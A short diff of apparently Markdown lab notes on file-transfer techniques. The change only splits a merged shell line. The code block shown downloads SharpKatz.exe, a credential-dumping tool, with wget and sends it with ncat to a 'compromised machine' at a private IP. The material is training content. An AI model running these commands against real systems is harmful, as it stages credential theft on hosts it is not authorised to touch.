@@ -77,7 +77,8 @@ By utilizing Ncat on our attacking host, we can opt for `--send-only` rather t
 ### **Ncat - Attack Host - Sending File to Compromised machine**
 
 ```
-th1nyunb0y@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exeth1nyunb0y@htb[/htb]$ # Example using Ncat
+th1nyunb0y@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
+th1nyunb0y@htb[/htb]$ # Example using Ncat
 th1nyunb0y@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
 ```
 
